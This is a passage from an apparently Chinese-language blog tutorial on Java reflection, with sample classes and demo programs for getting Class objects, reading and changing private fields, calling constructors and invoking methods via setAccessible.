class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionMain</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> id=<span class="number">9527</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> grade;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">float</span> score;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> rank;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">Person</span><span class="params">(<span class="keyword">long</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">18</span>,<span class="string">&quot;Pan3a&quot;</span>,id,<span class="number">9</span>,<span class="number">9999</span>,<span class="number">31</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(age,<span class="string">&quot;Pan3a&quot;</span>,<span class="number">9527</span>,<span class="number">9</span>,<span class="number">9999</span>,<span class="number">30</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> age,String name,<span class="keyword">long</span> id,<span class="keyword">long</span> grade,<span class="keyword">float</span> score,<span class="keyword">int</span> rank)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.grade = grade;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">        <span class="keyword">this</span>.rank = rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">long</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getGrade</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> grade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGrade</span><span class="params">(<span class="keyword">long</span> grade)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.grade = grade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getScore</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">float</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRank</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRank</span><span class="params">(<span class="keyword">int</span> rank)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rank = rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">final</span> StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;Person&#123;&quot;</span>);</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;age=&quot;</span>).append(age);</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;, name=&#x27;&quot;</span>).append(name).append(<span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;, id=&quot;</span>).append(id);</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;, grade=&quot;</span>).append(grade);</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;, score=&quot;</span>).append(score);</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;, rank=&quot;</span>).append(rank);</span><br><span class="line">        stringBuffer.append(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String role = <span class="string">&quot;Teacher&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Teacher&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String role = <span class="string">&quot;Student&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Student&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h2><ul><li>对象的获取有三种方式分别是<code>Class.forName(全类名)</code>,<code>对象.getclass()</code>，<code>类名.class</code>。 </li><li>这里的三种方式虽然作用都一样，但是都有各自的缺点。 </li><li><code>class.forName</code>需要知道类名的全路径。<code>对象名.class</code>需要存在已经实例化的对象。<code>类名.class</code>需要提前在编译前知道类名。 </li><li>下面会发现这里的比较都是<code>true</code>，因此说这里返回的对象都是同一个，因此<code>Person.class</code>只加载了一次。 </li><li>用<code>instanceof</code>不但匹配指定类型，还匹配指定类型的子类。而用<code>==</code>判断<code>class</code>实例可以精确地判断数据类型，但不能作子类型比较。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionGetClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        com.pan3a.reflection.Student student = <span class="keyword">new</span> com.pan3a.reflection.Student();</span><br><span class="line">        com.pan3a.reflection.Teacher teacher = <span class="keyword">new</span> com.pan3a.reflection.Teacher();</span><br><span class="line">        com.pan3a.reflection.Person person = <span class="keyword">new</span> com.pan3a.reflection.Person();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(student <span class="keyword">instanceof</span> com.pan3a.reflection.Person)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Student 是 Person 子类&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//      Class.forName</span></span><br><span class="line">        Class class1 = Class.forName(<span class="string">&quot;com.pan3a.reflection.Person&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;别名:&quot;</span> + class1.getSimpleName());</span><br><span class="line">        System.out.println(class1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      类名.class</span></span><br><span class="line">        Class class2 = com.pan3a.reflection.Person.class;</span><br><span class="line">        System.out.println(class2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      对象.getClass()</span></span><br><span class="line">        com.pan3a.reflection.Person person1 = <span class="keyword">new</span> com.pan3a.reflection.Person();</span><br><span class="line">        Class class3 = person1.getClass();</span><br><span class="line">        System.out.println(class3);</span><br><span class="line"></span><br><span class="line">        System.out.println(class1 == class2);</span><br><span class="line">        System.out.println(class1 == class3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h2><ul><li>获取成员变量需要知道一下四个方法，<code>getField</code>，<code>getFields</code>，<code>getDeclaredField</code>，<code>getDeclaredFields</code>。</li><li>还可获取成员变量属性的三个方法，<code>getType</code>，<code>getModifiers</code>，<code>getName</code>。分别是获取变量类型，修饰符，成员名。</li><li>他们分别是获取单个成员，和获取所有成员，获取单个成员（忽略修饰服限制，不包括父类），获取多个成员（忽略修饰服限制，不包括父类）。需注意的是使用后面两个是需使用<code>setAccessible(true)</code>来忽略编译时的安全检查。</li><li>这里牵扯到了反射实现构造方法，后面也再会讲到。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionGetField</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class class1 = Class.forName(<span class="string">&quot;com.pan3a.reflection.Person&quot;</span>);</span><br><span class="line">        getFieldStudy(class1);</span><br><span class="line">        getFieldsStudy(class1);</span><br><span class="line">        getDeclaredFieldStudy(class1);</span><br><span class="line">        getDeclaredFieldsStudy(class1);</span><br><span class="line">        setFieldStudy(class1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getFieldStudy</span><span class="params">(Class class1)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getField&quot;</span>);</span><br><span class="line">        Field fieldId = class1.getField(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        System.out.println(fieldId);</span><br><span class="line">        Field fieldGrade = class1.getField(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">        System.out.println(fieldGrade);</span><br><span class="line">        System.out.println();</span><br><span class="line"><span class="comment">//      该对象还有其他成员但是用此方法无法获取，因为他们不是用public修饰的</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getFieldsStudy</span><span class="params">(Class class1)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getFields&quot;</span>);</span><br><span class="line">        Field[] fields = class1.getFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields)&#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getDeclaredFieldStudy</span><span class="params">(Class class1)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getDeclaredField&quot;</span>);</span><br><span class="line">        Field fieldAge = class1.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        System.out.println(fieldAge);</span><br><span class="line">        Field fieldName = class1.getDeclaredField(<span class="string">&quot;score&quot;</span>);</span><br><span class="line">        System.out.println(fieldName);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getDeclaredFieldsStudy</span><span class="params">(Class class1)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getDeclaredFields&quot;</span>);</span><br><span class="line">        Field[] fields = class1.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field:fields)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成员名:&quot;</span> + field.getName() + <span class="string">&quot;\t成员修饰符:&quot;</span> + field.getModifiers() + <span class="string">&quot;\t成员类型:&quot;</span> + field.getType());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  反射修改私有成员值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldStudy</span><span class="params">(Class class1)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反射获取,修改成员值&quot;</span>);</span><br><span class="line">        com.pan3a.reflection.Person person = <span class="keyword">new</span> com.pan3a.reflection.Person();</span><br><span class="line">        System.out.println(<span class="string">&quot;ID:&quot;</span> + person.getId());</span><br><span class="line"><span class="comment">//      反射获取成员变量值并且修改成员变量</span></span><br><span class="line">        Field fieldAge = class1.getDeclaredField(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        fieldAge.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//      实例化对象为后面获取,修改成员做准备,这里后面还会讲到的构造方法</span></span><br><span class="line">        Object object = class1.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;ID:&quot;</span> + fieldAge.get(object));</span><br><span class="line">        fieldAge.set(object,<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ID:&quot;</span> + fieldAge.get(object));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h2><ul><li>平常正向操作都是<code>new</code>一个对象。通过反射调用构造方法有两种方式，分别是<code>Person.class.newInstance()</code>，<code>(Person)constructor.newInstance()</code>。两者区别就是前者无法调用含参的构造方法，后者可以。</li><li>实例化对象时，对于非<code>public</code>的任然需要<code>constructor.setAccessible(true)</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionConstructor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class personClass = Class.forName(<span class="string">&quot;com.pan3a.reflection.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;所有构造方法&quot;</span>);</span><br><span class="line">        Constructor[] constructors = personClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor constructor:constructors)&#123;</span><br><span class="line">            System.out.println(constructor);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;public无参数构造方法&quot;</span>);</span><br><span class="line"><span class="comment">//      默认当前类的无参数构造方法</span></span><br><span class="line">        Constructor constructor1 = personClass.getConstructor();</span><br><span class="line">        System.out.println(constructor1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;protected带参数构造方法&quot;</span>);</span><br><span class="line">        Constructor constructor2 = personClass.getDeclaredConstructor(<span class="keyword">long</span>.class);</span><br><span class="line">        System.out.println(constructor2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;private带参数构造方法&quot;</span>);</span><br><span class="line">        Constructor constructor3 = personClass.getDeclaredConstructor(<span class="keyword">int</span>.class);</span><br><span class="line">        System.out.println(constructor3 + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;public无参数构造方法创建对象&quot;</span>);</span><br><span class="line">        Object person1 = constructor1.newInstance();</span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;protected带参数构造方法创建对象&quot;</span>);</span><br><span class="line">        constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object person2 = constructor2.newInstance(<span class="number">9528</span>);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;private带参数构造方法创建对象&quot;</span>);</span><br><span class="line">        constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object person3 = constructor3.newInstance(<span class="number">18</span>);</span><br><span class="line">        System.out.println(person3);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Person.class.newInstance()&quot;</span>);</span><br><span class="line">        Class class1 = com.pan3a.reflection.Person.class;</span><br><span class="line">        Object object = class1.newInstance();</span><br><span class="line">        System.out.println(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h2><ul><li>获取成员方法如通获取成员变量类似，也有四个方法。<code>getMethod</code>，<code>getMethods</code>，<code>getDeclaredMethod</code>，<code>getDeclaredMethods</code>。</li><li>获取方法属性，<code>getName</code>，<code>getReturnType</code>，<code>getParameterTypes</code>，<code>getModifiers</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionMethod</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class personClass = Class.forName(<span class="string">&quot;com.pan3a.reflection.Person&quot;</span>);</span><br><span class="line">        getMethodStudy(personClass);</span><br><span class="line"><span class="comment">//        getMethodsStudy(personClass);</span></span><br><span class="line">        getDeclaredMethodStudy(personClass);</span><br><span class="line"><span class="comment">//        getDeclaredMethodsStudy(personClass);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getMethodStudy</span><span class="params">(Class personClass)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getMethod获取单个非public方法&quot;</span>);</span><br><span class="line">        Object object = personClass.newInstance();</span><br><span class="line">        Method method = personClass.getMethod(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        System.out.println(method);</span><br><span class="line">        <span class="keyword">long</span> Id = (<span class="keyword">long</span>) method.invoke(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;Id:&quot;</span> + Id);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      多态，依旧根据传入的实例化对象为准，如果没有则向父类寻找</span></span><br><span class="line">        Class teacherClass = Class.forName(<span class="string">&quot;com.pan3a.reflection.Teacher&quot;</span>);</span><br><span class="line">        Method method1 = teacherClass.getMethod(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">        method1.invoke(<span class="keyword">new</span> com.pan3a.reflection.Student());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getMethodsStudy</span><span class="params">(Class personClass)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getMethods获取所有非public方法&quot;</span>);</span><br><span class="line">        Method[] methods = personClass.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method:methods)&#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getDeclaredMethodStudy</span><span class="params">(Class personClass)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getDeclaredMethod单个方法不限制修饰符&quot;</span>);</span><br><span class="line">        Object object = personClass.newInstance();</span><br><span class="line">        Method method = personClass.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>,String.class);</span><br><span class="line">        System.out.println(method);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method.invoke(object,<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      由于这里和方法为静态方法，因此object为null</span></span><br><span class="line">        Method method1 = personClass.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">        method1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method1.invoke(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getDeclaredMethodsStudy</span><span class="params">(Class personClass)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;获取所有方法&quot;</span>);</span><br><span class="line">        Method[] methods = 